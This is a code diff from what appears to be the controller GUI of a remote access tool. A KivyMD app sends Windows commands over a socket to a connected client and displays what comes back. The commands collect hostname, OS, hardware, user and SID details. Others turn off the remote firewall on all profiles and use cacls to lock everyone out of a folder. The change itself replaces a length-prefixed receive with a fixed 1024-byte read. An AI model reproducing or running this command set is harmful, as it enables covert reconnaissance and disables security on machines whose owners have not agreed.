@@ -195,7 +195,6 @@ class Main(MDApp):
             print('Command sent to client: ', command)
 
             # Receive the output given from the client
-            #recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(1024)).decode()
             print('Output: ', output)
             self.root.ids.consoleField.text = output
@@ -211,22 +210,19 @@ class Main(MDApp):
             command = 'systeminfo | findstr /C:"Hostname"'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.currConn.recv(int(1024)).decode()
 
             # Get OS Information
             command = 'systeminfo | findstr /C:"OS"'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize2 = self.currConn.recv(1024).decode()
-            output2 = self.currConn.recv(int(recvsize)).decode()
+            output2 = self.currConn.recv(int(1024)).decode()
 
             #Get Processor Information
             command = 'wmic path win32_Processor get Name,NumberOfCores,NumberOfLogicalProcessors'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize3 = self.currConn.recv(1024).decode()
-            output3 = self.currConn.recv(int(recvsize2)).decode()
+            output3 = self.currConn.recv(int(1024)).decode()
 
             # Print results
             print('Output: \n')
@@ -244,22 +240,19 @@ class Main(MDApp):
             command = 'wmic path win32_VideoController get name'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.currConn.recv(int(1024)).decode()
 
             # Get GPU Description
             command = 'wmic path win32_VideoController get Description'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize2 = self.currConn.recv(1024).decode()
-            output2 = self.currConn.recv(int(recvsize2)).decode()
+            output2 = self.currConn.recv(int(1024)).decode()
 
             # Get GPU Version
             command = 'wmic path win32_VideoController get DriverVersion'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize3 = self.currConn.recv(1024).decode()
-            output3 = self.currConn.recv(int(recvsize2)).decode()
+            output3 = self.currConn.recv(int(1024)).decode()
 
             # Print results
             print('Output: \n')
@@ -279,8 +272,7 @@ class Main(MDApp):
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.currConn.recv(int(1024)).decode()
             
             print('Output: ', output)
             self.root.ids.consoleField.text = output
@@ -298,8 +290,7 @@ class Main(MDApp):
             print('Command sent to client: ', command)
 
             # Receive output from client
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()  # Still needs more buffer
+            output = self.currConn.recv(int(1024)).decode()  # Still needs more buffer
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
@@ -314,8 +305,7 @@ class Main(MDApp):
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.currConn.recv(int(1024)).decode()
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
@@ -330,8 +320,7 @@ class Main(MDApp):
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.currConn.recv(int(1024)).decode()
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
@@ -346,21 +335,18 @@ class Main(MDApp):
             command = 'wmic MEMORYCHIP get BankLabel, DeviceLocator, Capacity, Speed'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.currConn.recv(int(1024)).decode()
             
             # Available memory
             command = 'systeminfo | findstr /C:"Available Physical Memory"'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize2 = self.currConn.recv(1024).decode()
-            output2 = self.currConn.recv(int(recvsize2)).decode()
+            output2 = self.currConn.recv(int(1024)).decode()
             # Cache
             command = 'wmic cpu get L2CacheSize, L3CacheSize'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize3 = self.currConn.recv(1024).decode()
-            output3 = self.currConn.recv(int(recvsize3)).decode()
+            output3 = self.currConn.recv(int(1024)).decode()
 
             # Print result
             print('Output: \n')
@@ -379,16 +365,14 @@ class Main(MDApp):
             command = 'net user "%USERNAME%"'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.currConn.recv(int(1024)).decode()
             output = output.splitlines()
 
             # Get SID
             command = 'wmic useraccount where name="%USERNAME%" get sid'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize2 = self.currConn.recv(1024).decode()
-            output2 = self.currConn.recv(int(recvsize2)).decode()
+            output2 = self.currConn.recv(int(1024)).decode()
             output2 = output2.splitlines()
 
             # Print results
@@ -408,8 +392,7 @@ class Main(MDApp):
             command = "netsh advfirewall set allprofiles state off"
             self.currConn.send(command.encode())
             print('[+] Command sent')
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.currConn.recv(int(1024)).decode()
             print(f"Output: {output}")
             self.root.ids.consoleField.text = output
             break
@@ -420,8 +403,7 @@ class Main(MDApp):
             command = 'cacls "C:\\Users\\%USERNAME%\\Desktop\\Test" /E /P everyone:n'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.currConn.recv(int(1024)).decode()
             print('Output: ', output)
             break
 
